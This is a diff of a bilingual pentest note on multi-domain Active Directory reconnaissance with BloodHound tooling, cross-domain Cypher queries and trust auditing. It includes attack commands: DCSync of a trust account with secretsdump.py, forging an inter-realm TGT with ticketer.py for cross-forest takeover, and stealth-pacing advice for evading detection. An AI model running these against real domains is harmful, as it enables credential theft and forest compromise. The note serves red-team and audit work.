@@ -20,193 +20,112 @@ linked:
 
 ***
 
-## Multi-Domain Collection Workflow
+## Multi-Domain Workflow
 
-| **Step** | **Comando** | **Notas** |
+| **Step** | **Comando** | **Detalle** |
 |:---:|:---:|:---:|
-| 1. Identify forest topology | `Get-ADForest` | Standard. |
-| 2. Per-domain SharpHound | `SharpHound -d childdom -c All --OutputDirectory loot/childdom` | Standard. |
-| 3. Per-domain BloodHound.py | `bloodhound-python -d childdom -u user@childdom -p pass -ns DC -c All --zip` | Linux. |
-| 4. Per-domain RustHound | `rusthound -d childdom -u user@childdom -p pass --zip -o loot/childdom/` | Modern. |
-| 5. Multi-domain ingest | Drag all ZIPs into BHCE | Standard. |
-| 6. Auto-correlate cross-domain | BHCE 6.x | Tool. |
-| 7. Cypher cross-domain queries | Custom | Standard. |
-| Per-domain auth required | Standard | Standard. |
-| Trust account auth (cross-domain) | Edge | Adjacent. |
-| Modern: BHCE 6.x improved cross-domain | Standard | Tool. |
-| Detection: multi-domain queries | Defender | Adjacent. |
-| OPSEC: per-domain pacing | Stealth | OPSEC. |
-| Compliance: documented per-domain | Standard | Adjacent. |
-| Cross-correlate trust attributes | Standard | Audit. |
-| Adjacent: Trust hub | Cross-ref | Adjacent. |
-| Audit baseline | Standard | Compliance. |
+| 1. Identificar forest topology | `Get-ADForest \| Select Domains` | Pre-collection. |
+| 2. Per-domain auth (own creds o trust account) | Per-domain credentials | Standard. |
+| 3. Per-domain SharpHound o BloodHound.py | Sequential collection | Multi-domain. |
+| 4. Drag-drop todos ZIPs en BHCE UI | Auto-correlate cross-domain | Ingest. |
+| 5. Cypher cross-domain queries | `WHERE u.domain <> t.domain` | Analysis. |
 ^ad-multidom-workflow
 
-### Multi-domain collection
-
 ```bash
-# Bash forest collection
-forest_domains="domA.local domB.local domC.local"
-
-for dom in $forest_domains; do
-  echo "=== Collecting $dom ==="
-  
-  # Find DC
-  dc=$(dig +short SRV _ldap._tcp.dc._msdcs.$dom | awk '{print $4}' | head -1 | sed 's/\.$//')
-  
-  # BloodHound.py
-  bloodhound-python -d $dom -u user@$dom -p pass -ns $dc -c All --zip -o ./loot/$dom/
+# Linux multi-domain pipeline
+for d in corp.local partner.com vendor.local; do
+  DC=$(dig +short SRV "_ldap._tcp.dc._msdcs.$d" | awk '{print $4}' | head -1 | sed 's/\.$//')
+  echo "=== Collecting $d via $DC ==="
+  bloodhound-python -d "$d" -u "auditor@$d" -p 'Pass!' -ns "$DC" -c All --zip -o "./loot/$d/"
 done
 
-# Ingest all in BHCE Web UI
+# Drag todos los ZIPs en BHCE → auto-correlate
 ```
 
 ___
 
 ## Cross-Domain Cypher Queries
 
-| **Query** | **Use** | **Notas** |
-|:---:|:---:|:---:|
-| `MATCH (u:User), (g:Group {name: "...@FOREIGN"})` | Cross-domain target | Standard. |
-| `WHERE u.domain <> g.domain` | Filter cross-domain | Standard. |
-| `MATCH (a:Domain)-[:Trusts]->(b:Domain)` | Trust relationships | Standard. |
-| `WHERE r.istransitive = true` | Transitive trusts | Standard. |
-| `WHERE r.direction = "Outbound"` | Direction filter | Standard. |
-| Cross-trust foreign principals | Critical | Audit. |
-| Cross-domain DCSync paths | Forest takeover | Critical. |
-| Cross-trust ACL chains | Cross-forest privesc | Critical. |
-| Modern BHCE 6.x improved | Standard | Tool. |
-| Per-trust attribute filter | Standard | Standard. |
-| Cross-correlate trust direction | Standard | Audit. |
-| Detection: cross-domain queries | Defender | Adjacent. |
-| Adjacent: Trust hub | Cross-ref | Adjacent. |
-| Custom analytics | Tool. |
-| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
-| Modern: continuous BHCE | Defender side | Adjacent. |
-^ad-multidom-cypher
-
-### Cross-domain queries
-
 ```cypher
-// All trusts visualization
-MATCH (a:Domain)-[r:Trusts]->(b:Domain) RETURN a, r, b
+// 1. All trust relationships (forest map)
+MATCH (a:Domain)-[r:Trusts]->(b:Domain)
+RETURN a.name,b.name,r.direction,r.istransitive
 
-// Foreign principals in priv groups (cross-trust)
-MATCH (u)-[:MemberOf*1..]->(g:Group {adminCount: true})
+// 2. Foreign principals en priv groups (cross-trust)
+MATCH (u)-[:MemberOf*1..]->(g:Group {highvalue:true})
 WHERE u.domain <> g.domain
-RETURN u.name, u.domain, g.name, g.domain
+RETURN u.name,u.domain,g.name,g.domain
 
-// Cross-trust DCSync
-MATCH (u)-[:GetChanges|GetChangesAll]->(d:Domain)
+// 3. Cross-trust DCSync paths
+MATCH (u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
 WHERE u.domain <> d.name
-RETURN u.name, u.domain, d.name
+RETURN u.name,u.domain,d.name
 
-// Path from owned in dom-A → DA in dom-B
-MATCH (u {owned: true}), (g:Group {name: "DOMAIN ADMINS@DOM-B.LOCAL"})
+// 4. Path desde owned en domain-A → DA en domain-B
+MATCH (u {owned:true})
+MATCH (g:Group {name:"DOMAIN ADMINS@DOM-B.LOCAL"})
 MATCH p=shortestPath((u)-[*1..]->(g))
 RETURN p
 
-// Forest-wide most-exposed users
-MATCH (u:User {enabled: true})
-WHERE u.adminCount = true
+// 5. Forest-wide most-exposed users
+MATCH (u:User {enabled:true, adminCount:true})
 WITH u, COUNT { (other)-[*1..10]->(u) } AS exposure
-RETURN u.name, u.domain, exposure ORDER BY exposure DESC LIMIT 20
+RETURN u.name,u.domain,exposure ORDER BY exposure DESC LIMIT 20
 ```
+^ad-multidom-cypher
 
 ___
 
 ## Cross-Trust Authentication
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué hace** | **Cuándo** |
 |:---:|:---:|:---:|
-| Forest trust auth | Forest-wide | Standard. |
-| External trust auth | Limited scope | Adjacent. |
-| Realm trust (MIT KDC) | Edge | Edge. |
-| `runas /netonly /user:OTHERDOM\user` | Cross-trust auth | Standard. |
-| `bloodhound-python -d FOREIGN -u user@FOREIGN -p pass` | Cross-trust collection | Adjacent. |
-| Trust password discovery via DCSync | Adjacent | Adjacent. |
-| Inter-realm TGT forge | Edge | Adjacent. |
-| Cross-trust Kerberoast | Edge | Adjacent. |
-| Detection: cross-trust auth | Defender | Adjacent. |
-| Modern: extreme alerting cross-trust | Critical | Standard. |
-| Adjacent: Trust hub | Cross-ref | Adjacent. |
-| Compliance: documented per-trust | Standard | Adjacent. |
-| Cross-correlate trust attributes | Standard | Audit. |
-| Modern: continuous BHCE | Defender side | Adjacent. |
-| OPSEC: cross-trust loud | Defender | OPSEC. |
-| Audit log retention | Standard | Adjacent. |
+| `runas /netonly /user:partner.com\u cmd` | Cross-trust auth desde Windows | Test interactive. |
+| `bloodhound-python -d partner.com -u u@partner.com -p pass -ns <foreign-DC> -c All --zip` | Collection cross-trust | Multi-domain. |
+| Trust password discovery via DCSync | `secretsdump.py corp/admin:pass@<DC> -just-dc-user 'PARTNER$'` | Forge inter-realm TGT. |
+| Inter-realm TGT forge (con trust hash) | `ticketer.py -nthash <hash> -domain-sid ... -extra-sid ... -spn krbtgt/partner.com Administrator` | Cross-forest pivot. |
 ^ad-multidom-auth
 
 ___
 
 ## SID Filtering Considerations
 
-| **Concepto** | **Detalle** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| SID Filtering enabled cross-trust | Default forest trust | Hardening. |
-| Disabled cross-trust = forest takeover | Critical | Critical. |
-| Detection via trust attributes | Standard | Audit. |
-| `Get-ADTrust -Properties SIDFilteringForestAware,SIDFilteringQuarantined` | RSAT | Standard. |
-| Cross-correlate with priv | Standard | Audit. |
-| Modern: extreme audit cross-trust | Best practice | Standard. |
-| Adjacent: Trust hub | Cross-ref | Adjacent. |
-| Adjacent: Authentication & SID Filtering | Cross-ref | Adjacent. |
-| Detection: SID Filtering modify events | Defender | Adjacent. |
-| BloodHound trust attribute analysis | Modern | Tool. |
-| Compliance: documented baseline | Standard | Adjacent. |
-| Audit: per-quarter cross-trust | Standard | Compliance. |
-| Cleanup: post-engagement | Standard | OPSEC. |
-| Modern: continuous BHCE | Defender side | Adjacent. |
-| Cross-correlate trust direction | Standard | Audit. |
-| Audit log retention | Standard | Adjacent. |
+| `Get-ADTrust -Filter * -Properties SIDFilteringForestAware,SIDFilteringQuarantined` | Trust SID Filtering status | Pre-attack audit. |
+| `Get-ADTrust -Filter * -Pr trustAttributes \| ? {-not ($_.trustAttributes -band 0x4) -and -not ($_.trustAttributes -band 0x40)}` | Trusts SIN SID Filter (RISKY) | Critical audit. |
+| `nltest /domain_trusts /v \| findstr /i "quarantine"` | Native check | Quick. |
+| BloodHound trust attribute analysis | Cypher `MATCH (a:Domain)-[r:Trusts]->(b:Domain) RETURN r` | Visual. |
 ^ad-multidom-sidfilter
+
+**Por qué importa:** SID Filter ON cross-forest = bloquea SID History injection ataques. SID Filter OFF + DCSync local = forest takeover via inter-realm TGT forge con `ExtraSids`.
 
 ___
 
 ## Modern BHCE 6.x Forest Support
 
-| **Feature** | **Detail** | **Notas** |
+| **Feature** | **Detalle** | **Cuándo** |
 |:---:|:---:|:---:|
-| Auto cross-domain correlation | Standard | Tool. |
-| Forest-wide pre-built queries | Standard | Tool. |
-| OpenGraph for hybrid identity | Modern | Tool. |
-| Improved trust analysis | Standard | Tool. |
-| Per-domain ingest | Standard | Adjacent. |
-| Modern Cypher engine | Performance | Modern. |
-| Forest trust visualization | Standard | Tool. |
-| Cross-correlate Azure AD | Hybrid | Modern. |
-| Cross-correlate AzureHound | Cloud | Modern. |
-| Custom analytics scripts | Tool. |
-| Compliance: BHCE 6.x baseline | Standard | Adjacent. |
-| Audit log retention | Standard | Adjacent. |
-| Detection: BHCE 6.x events | Defender | Adjacent. |
-| Modern: continuous BHCE | Defender side | Adjacent. |
-| Cross-correlate with engagement | Per-engagement | Standard. |
-| Adjacent: BloodHound CE hub | Cross-ref | Adjacent. |
+| Auto cross-domain correlation | Drag multiple ZIPs → auto-correlate | Multi-domain. |
+| Forest-wide pre-built queries | Built-in Cypher panels | Standard. |
+| OpenGraph (hybrid) | AD + Entra ID cross-correlation | Hybrid envs. |
+| Improved trust analysis | Better trust edge handling | Modern. |
+| Per-domain ingest separation | Track source per domain | Audit. |
+| Cross-correlate AzureHound | Hybrid identity paths | Cloud + on-prem. |
 ^ad-multidom-bhce6
 
 ___
 
 ## OPSEC Multi-Domain
 
-| **Aspect** | **Detail** | **Notas** |
+| **Práctica** | **Detalle** | **Cuándo** |
 |:---:|:---:|:---:|
-| Per-domain pacing | Stealth | OPSEC. |
-| Time-of-day pacing | Match legit | Stealth. |
-| Per-domain credentials | Different per-domain | Adjacent. |
-| OPSEC: targeted vs bulk | Trade-off | OPSEC. |
-| Detection: cross-domain bulk | Defender ML | Modern. |
-| Modern: BHCE 6.x continuous | Defender side | Adjacent. |
-| Compliance: red team scoped | Standard | OPSEC. |
-| Cross-correlate with engagement | Per-engagement | Standard. |
-| Modern: extreme alerting | Critical | Standard. |
-| Cleanup post-engagement | Standard | OPSEC. |
-| Per-domain ingest separate | Isolation | Adjacent. |
-| Audit log retention | Standard | Adjacent. |
-| Cross-correlate trust direction | Standard | Audit. |
-| OPSEC: stealth flags per collector | Standard | Standard. |
-| Detection: per-domain alerts | Defender | Adjacent. |
-| Modern: continuous monitoring | Defender side | Adjacent. |
+| Per-domain pacing | Different per-DC delay | Stealth. |
+| Time-of-day matching | Match legit recon | Match baseline. |
+| Per-domain credentials | Use creds del domain target (no cross-trust de unique user) | OPSEC. |
+| Cross-trust auth = loud | MDI flagga cross-realm auth | Defender side. |
+| Per-domain ingest separate | Different ZIPs por domain | Track per source. |
+| Targeted en vez de bulk forest sweep | Reduce signature | Stealth. |
 ^ad-multidom-opsec
 
 ***
